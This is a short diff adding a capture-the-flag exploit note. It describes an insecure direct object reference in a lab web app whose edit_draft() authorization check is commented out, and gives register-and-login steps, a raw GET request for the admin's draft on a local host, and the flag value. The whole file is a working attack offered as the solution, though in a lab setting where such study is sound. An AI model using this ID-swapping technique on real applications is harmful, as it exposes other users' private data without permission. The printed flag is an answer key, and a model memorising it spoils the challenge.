@@ -1,0 +1,5 @@
+# IDOR: Any authenticated user can GET /edit_draft/1 (admin's draft) to read the flag. The authorization check in edit_draft() is commented out. First: register a user via POST /register, login via POST /login to get a session cookie, then use that cookie here. Admin draft (ID=1) contains flag{5f7d543b-2625-4b62-8373-53ba76f41608}
+
+GET /edit_draft/1 HTTP/1.1
+Host: 172.17.0.1:58617
+Cookie: session=<attacker_session_cookie>
